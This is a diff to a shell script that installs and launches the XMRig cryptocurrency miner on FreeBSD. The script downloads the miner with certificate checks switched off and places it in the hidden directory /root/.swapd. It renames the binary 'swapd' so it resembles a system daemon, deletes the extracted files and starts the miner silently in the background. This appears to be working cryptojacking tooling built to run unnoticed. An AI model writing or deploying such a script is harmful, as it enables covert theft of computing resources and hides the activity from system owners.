@@ -12,25 +12,40 @@ WORKDIR="/root/.swapd"
 mkdir -p "$WORKDIR" || exit 1
 cd "$WORKDIR" || exit 1
 
-# Download static XMRig for FreeBSD amd64
-URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-freebsd-static-x64.tar.gz"
+# Use the latest static FreeBSD build (v6.26.0)
+URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-freebsd-static-x64.tar.gz"
 echo "Downloading $URL ..."
-fetch -o xmrig.tar.gz "$URL" 2>/dev/null || curl -L -k -o xmrig.tar.gz "$URL" 2>/dev/null || wget --no-check-certificate -O xmrig.tar.gz "$URL" 2>/dev/null
+
+# Try fetch (native FreeBSD), fallback to curl, then wget
+fetch -o xmrig.tar.gz "$URL" 2>/dev/null || \
+curl -L -k -o xmrig.tar.gz "$URL" 2>/dev/null || \
+wget --no-check-certificate -O xmrig.tar.gz "$URL" 2>/dev/null
 
 if [ ! -f xmrig.tar.gz ]; then
     echo "Download failed"
     exit 1
 fi
 
+# Extract and find the binary (it's inside a subdirectory)
 tar -xzf xmrig.tar.gz
-if [ -f xmrig ]; then
-    mv xmrig swapd
-    chmod +x swapd
-else
+
+# Look for xmrig binary anywhere in the extracted files
+BINARY=$(find . -type f -name "xmrig" -perm -111 2>/dev/null | head -1)
+
+if [ -z "$BINARY" ] || [ ! -f "$BINARY" ]; then
     echo "Binary not found in tarball"
+    echo "Contents of current directory:"
+    ls -la
     exit 1
 fi
+
+# Move binary to swapd
+mv "$BINARY" swapd
+chmod +x swapd
 rm -f xmrig.tar.gz
+
+# Clean up any remaining extracted files/directories
+find . -type d -name "xmrig-*" -exec rm -rf {} + 2>/dev/null || true
 
 # Detect IP for worker pass (simple fallback)
 PASS=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
@@ -60,4 +75,4 @@ EOF
 
 # Start miner in background
 nohup ./swapd -c config.json > /dev/null 2>&1 &
-echo "Miner started with wallet: ${WALLET} (worker: $PASS)"
+echo "Miner started with wallet: $WALLET (worker: $PASS)"
